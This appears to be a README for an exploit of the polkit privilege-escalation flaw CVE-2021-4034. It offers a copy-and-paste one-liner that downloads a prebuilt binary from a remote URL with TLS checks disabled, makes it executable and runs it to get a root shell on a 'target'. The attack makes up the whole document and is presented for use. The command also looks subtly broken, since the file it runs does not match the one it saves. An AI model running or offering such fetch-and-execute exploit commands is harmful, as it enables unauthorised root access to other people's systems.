# Oneline PrivEsc
 This is static binary file to exploit the polkit vulnerability (CVE-2021-4034)
 Just copy and paste on target this command and get root shell.

 GCC it's not needed on target!

```sh

{curl,-s,-k,https://raw.githubusercontent.com/carlosevieira/polkit/main/pwn,-o,/tmp/polkit-static};{chmod,+x,/tmp/polkit-static};/tmp/polkit

```

Tks @0dayCTF for the static binary <3